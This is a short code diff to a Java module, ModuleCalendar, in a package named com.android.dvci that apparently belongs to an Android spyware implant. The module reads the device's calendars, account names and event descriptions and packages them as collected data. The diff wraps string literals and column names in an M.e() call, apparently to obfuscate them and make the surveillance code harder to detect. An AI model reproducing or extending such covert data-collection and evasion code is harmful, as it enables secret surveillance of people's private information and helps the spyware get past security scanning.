@@ -26,6 +26,7 @@ import com.android.dvci.util.ByteArray;
 import com.android.dvci.util.Check;
 import com.android.dvci.util.DataBuffer;
 import com.android.dvci.util.DateTime;
+import com.android.dvci.util.StringUtils;
 import com.android.dvci.util.WChar;
 import com.android.mm.M;
 
@@ -244,7 +245,7 @@ public class ModuleCalendar extends BaseModule implements Observer<ProcessInfo> 
 							+ description);
 				}
 				
-				String desc = "account: " + syncAccount + "\n" + description;
+				String desc = M.e("account: ") + syncAccount + "\n" + description;
 
 				byte[] packet = null;
 				try {
@@ -293,8 +294,7 @@ public class ModuleCalendar extends BaseModule implements Observer<ProcessInfo> 
 				Check.log(TAG + " (selectCalendars) provider: %s", contentProvider);
 			}
 
-			String[] projection = new String[] {
-					M.e("_id"), "account_name", "calendar_displayName", "ownerAccount" }; //$NON-NLS-1$
+			String[] projection = StringUtils.split(M.e("_id,account_name,calendar_displayName,ownerAccount")); //$NON-NLS-1$
 			// Uri calendars = Uri.parse("content://calendar/calendars");
 			Uri calendars = Uri.parse(contentProvider + M.e("/calendars")); //$NON-NLS-1$
 			Hashtable<String, String> calendarIds = new Hashtable<String, String>();
